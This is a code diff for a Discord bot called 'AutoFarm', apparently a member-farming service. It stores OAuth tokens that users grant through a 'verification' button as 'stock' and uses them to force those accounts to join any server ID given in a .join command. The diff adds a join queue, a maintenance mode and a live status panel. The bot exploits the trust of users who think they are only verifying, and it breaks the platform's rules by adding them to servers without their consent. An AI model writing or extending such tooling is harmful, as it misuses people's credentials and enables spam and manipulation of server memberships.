@@ -7,12 +7,18 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 8080;
 
-// Token Storage Database & Configurations
+// Database & Global State
 const tokenDatabase = []; 
 let restockCounter = 0; 
-let autoRestockEnabled = true; // Toggle for .autorestock command
+let autoRestockEnabled = true; 
+let maintenanceMode = false;
 let currentPrefix = '.';
 let discordClient = null;
+
+// Queue & Status Management
+let activeJoinTask = null; // Stores current join running info
+const joinQueue = [];      // Stores queued join requests
+let statusMessageRef = null; // Stores reference to auto-updating message
 
 // Homepage and OAuth Callback handler
 app.get('/', async (req, res) => {
@@ -74,7 +80,7 @@ app.get('/', async (req, res) => {
             restockCounter++;
             console.log(`[AUTORESTOCK] New account verified (${userData.username})! Total Stock: ${tokenDatabase.length} \vert{} Progress to alert:${restockCounter}/30`);
 
-            // 1. Send verification log to Log Channel
+            // Send log to log channel
             const logChannelId = process.env.LOG_CHANNEL_ID || '1561453902270955630';
             if (discordClient) {
                 try {
@@ -93,7 +99,7 @@ app.get('/', async (req, res) => {
                 }
             }
 
-            // 2. Check 30-person restock threshold alert (if enabled)
+            // 30-person restock trigger
             if (autoRestockEnabled && restockCounter >= 30) {
                 restockCounter = 0; 
 
@@ -171,22 +177,46 @@ const client = new Client({
 
 discordClient = client;
 
+// Auto-Update Status Embed Every 15 Seconds
+setInterval(async () => {
+    if (!statusMessageRef) return;
+
+    try {
+        const currentlyRunningText = activeJoinTask 
+            ? `Adding members to \`${activeJoinTask.targetGuildId}\` (${activeJoinTask.progress}/${activeJoinTask.total})`
+            : 'Nothing running';
+
+        const queueText = joinQueue.length > 0 
+            ? joinQueue.map((item, index) => `${index + 1}. Guild \`${item.targetGuildId}\` (${item.tokensToUse.length} members)`).join('\n')
+            : 'Empty';
+
+        const statusEmbed = new EmbedBuilder()
+            .setTitle('DJoin Status')
+            .setColor(0x5865F2)
+            .addFields(
+                { name: 'Currently Running', value: currentlyRunningText },
+                { name: 'Queue', value: queueText }
+            )
+            .setFooter({ text: `Auto-updates every 15s | Today at ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` });
+
+        await statusMessageRef.edit({ embeds: [statusEmbed] });
+    } catch (err) {
+        console.error('[STATUS LOOP ERROR] Failed to edit status embed:', err);
+    }
+}, 15000);
+
 client.once('ready', () => {
     console.log(`AutoFarm logged in as ${client.user.tag}! Prefix: '${currentPrefix}'`);
 });
 
 client.on('messageCreate', async message => {
-    // --- Auto-Delete Messages Feature (Channel ID: 1561453220633518181) ---
+    // Auto-Delete Messages in specific channel (ID: 1561453220633518181)
     if (message.channel.id === '1561453220633518181') {
         setTimeout(async () => {
             try {
-                if (message.deletable) {
-                    await message.delete();
-                }
-            } catch (err) {
-                // Ignore errors if message is already deleted
-            }
-        }, 7000); // Deletes after 7 seconds
+                if (message.deletable) await message.delete();
+            } catch (err) {}
+        }, 7000);
     }
 
     if (message.author.bot || !message.content.startsWith(currentPrefix)) return;
@@ -203,15 +233,15 @@ client.on('messageCreate', async message => {
             .addFields(
                 { 
                     name: '⚙️ Core & Verification', 
-                    value: `\`${currentPrefix}verify\` - Generates the OAuth2 verification button\n\`${currentPrefix}stock\` - Views total active accounts in the database\n\`${currentPrefix}join <serverID>\` - Forces verified accounts to join a target server\n\`${currentPrefix}bot\` - Provides the bot invite button\n\`${currentPrefix}status\` - Displays bot operational status` 
+                    value: `\`${currentPrefix}verify\` - Generates the OAuth2 verification button\n\`${currentPrefix}stock\` - Views total active accounts in database\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Views bot status or sets live status panel` 
                 },
                 { 
                     name: '🛠️ Config & Management', 
                     value: `\`${currentPrefix}autorestock enable|disable\` - Toggles automatic restock alerts\n\`${currentPrefix}prefix set <prefix>\` - Changes command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
                 },
                 { 
-                    name: '🛡️ Admin & Control', 
-                    value: `\`${currentPrefix}queue clear\` - Clears active execution queues\n\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
+                    name: '🛡️ Queue, Logs & Admin', 
+                    value: `\`${currentPrefix}queue clear\` - Clears active execution queue\n\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
                 }
             )
             .setFooter({ text: 'Member Farm Utility' });
@@ -259,12 +289,21 @@ client.on('messageCreate', async message => {
         return message.reply(`📦 **Current Stock Pool:** \`${tokenDatabase.length}\` accounts available.`);
     }
 
-    // 5. .status Command
+    // 5. .status Command (with `.status channel` to spawn auto-updating embed)
     if (command === 'status') {
-        const uptimeSeconds = Math.floor(client.uptime / 1000);
-        const hours = Math.floor(uptimeSeconds / 3600);
-        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
-        const seconds = uptimeSeconds % 60;
+        if (args[0] === 'channel') {
+            const statusEmbed = new EmbedBuilder()
+                .setTitle('DJoin Status')
+                .setColor(0x5865F2)
+                .addFields(
+                    { name: 'Currently Running', value: activeJoinTask ? `Adding to \`${activeJoinTask.targetGuildId}\`` : 'Nothing running' },
+                    { name: 'Queue', value: joinQueue.length > 0 ? `${joinQueue.length} items in queue` : 'Empty' }
+                )
+                .setFooter({ text: `Auto-updates every 15s | Today at ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` });
+
+            statusMessageRef = await message.channel.send({ embeds: [statusEmbed] });
+            return;
+        }
 
         const statusEmbed = new EmbedBuilder()
             .setTitle('🟢 AutoFarm Bot Status')
@@ -272,15 +311,41 @@ client.on('messageCreate', async message => {
             .addFields(
                 { name: '📊 Active Stock Pool', value: `\`${tokenDatabase.length}\` accounts`, inline: true },
                 { name: '🔄 Auto-Restock', value: autoRestockEnabled ? '`Enabled`' : '`Disabled`', inline: true },
-                { name: '🌐 Connected Servers', value: `\`${client.guilds.cache.size}\` servers`, inline: true },
-                { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
+                { name: '🛠️ Maintenance', value: maintenanceMode ? '`Enabled`' : '`Disabled`', inline: true },
+                { name: '🌐 Connected Servers', value: `\`${client.guilds.cache.size}\` servers`, inline: true }
             )
             .setTimestamp();
 
         return message.reply({ embeds: [statusEmbed] });
     }
 
-    // 6. .autorestock <enable|disable> Command
+    // 6. .queue command
+    if (command === 'queue') {
+        if (args[0] === 'clear') {
+            joinQueue.length = 0;
+            return message.reply('✅ Execution queue has been cleared.');
+        }
+        return message.reply(`📋 **Queue Status:** \`${joinQueue.length}\` task(s) currently waiting.`);
+    }
+
+    // 7. .maintenance command
+    if (command === 'maintenance') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            return message.reply('❌ You need Administrator permissions.');
+        }
+        const state = args[0] ? args[0].toLowerCase() : '';
+        if (state === 'enable') {
+            maintenanceMode = true;
+            return message.reply('🛠️ Maintenance mode **enabled**. Further join requests will be blocked.');
+        } else if (state === 'disable') {
+            maintenanceMode = false;
+            return message.reply('✅ Maintenance mode **disabled**.');
+        } else {
+            return message.reply(`Usage: \`${currentPrefix}maintenance enable\` or \`${currentPrefix}maintenance disable\``);
+        }
+    }
+
+    // 8. .autorestock <enable|disable> Command
     if (command === 'autorestock') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply('❌ You need Administrator permissions to change autorestock settings.');
@@ -298,7 +363,7 @@ client.on('messageCreate', async message => {
         }
     }
 
-    // 7. .restock <n> Command
+    // 9. .restock <n> Command
     if (command === 'restock') {
         const amount = parseInt(args[0]);
         if (isNaN(amount)) return message.reply(`Usage: \`${currentPrefix}restock <amount>\``);
@@ -306,14 +371,14 @@ client.on('messageCreate', async message => {
         return message.reply(`✅ Successfully restocked **${amount}** accounts manually. Total stock: \`${tokenDatabase.length}\`.`);
     }
 
-    // 8. .remove <n> Command
+    // 10. .remove <n> Command
     if (command === 'remove') {
         const amount = parseInt(args[0]) || 1;
         tokenDatabase.splice(0, amount);
         return message.reply(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
     }
 
-    // 9. .prefix set <prefix> Command
+    // 11. .prefix set <prefix> Command
     if (command === 'prefix' && args[0] === 'set') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply('❌ You need Administrator permissions to change the prefix.');
@@ -323,8 +388,12 @@ client.on('messageCreate', async message => {
         return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
     }
 
-    // 10. .join <Server ID> Command (Tiered Role Limits & Out-of-Stock Embed)
+    // 12. .join <Server ID> Command
     if (command === 'join') {
+        if (maintenanceMode) {
+            return message.reply('🛠️ Bot is currently under maintenance. Please try again later.');
+        }
+
         const targetGuildId = args[0];
         if (!targetGuildId) {
             return message.reply(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
@@ -362,13 +431,39 @@ client.on('messageCreate', async message => {
             message.channel.send(`⚠️ Role tier restriction applied: Maximum **${limit}** account(s) allowed per join.`);
         }
 
-        await message.reply(`AutoFarm attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);
+        // Add task to queue and process
+        const joinTask = { targetGuildId, tokensToUse, channel: message.channel };
+        joinQueue.push(joinTask);
+
+        if (!activeJoinTask) {
+            processQueue();
+        } else {
+            message.reply(`📥 Request added to queue! Position in queue: **${joinQueue.length}**`);
+        }
+    }
+
+    // Helper Function to process join queue iteratively
+    async function processQueue() {
+        if (joinQueue.length === 0) {
+            activeJoinTask = null;
+            return;
+        }
+
+        const currentJob = joinQueue.shift();
+        activeJoinTask = {
+            targetGuildId: currentJob.targetGuildId,
+            total: currentJob.tokensToUse.length,
+            progress: 0
+        };
+
+        await currentJob.channel.send(`AutoFarm attempting to add ${currentJob.tokensToUse.length} accounts to server ID \`${currentJob.targetGuildId}\`...`);
 
         let successCount = 0;
-        for (const tokenData of tokensToUse) {
+        for (const tokenData of currentJob.tokensToUse) {
+            activeJoinTask.progress++;
             if (tokenData.mock) continue; 
             try {
-                const joinRes = await fetch(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, {
+                const joinRes = await fetch(`https://discord.com/api/v10/guilds/${currentJob.targetGuildId}/members/${tokenData.user_id}`, {
                     method: 'PUT',
                     headers: {
                         Authorization: `Bot ${process.env.DISCORD_TOKEN}`,
@@ -385,16 +480,19 @@ client.on('messageCreate', async message => {
             }
         }
 
-        return message.channel.send(`AutoFarm successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
+        await currentJob.channel.send(`AutoFarm successfully added **${successCount}** out of **${currentJob.tokensToUse.length}** accounts to the server.`);
+        
+        activeJoinTask = null;
+        processQueue(); // Process next item in queue
     }
 
-    // 11. Panel Commands Handlers
+    // 13. Generic Panel Command Responses
     const panelCommands = [
         'channel', 'checkauth', 'checkserver', 'panel',
         'basesend', 'send', 'verifyrole', 'cooldown', 'bio', 'color',
-        'stats', 'profile', 'maintenance', 'banfarm', 'antiraid',
+        'stats', 'profile', 'banfarm', 'antiraid',
         'logfarm', 'logserver', 'logerrors', 'logadmin', 'logs', 'log',
-        'queue', 'blacklist', 'leave', 'antileave', 'announce', 'invites'
+        'blacklist', 'leave', 'antileave', 'announce', 'invites'
     ];
 
     if (panelCommands.includes(command)) {
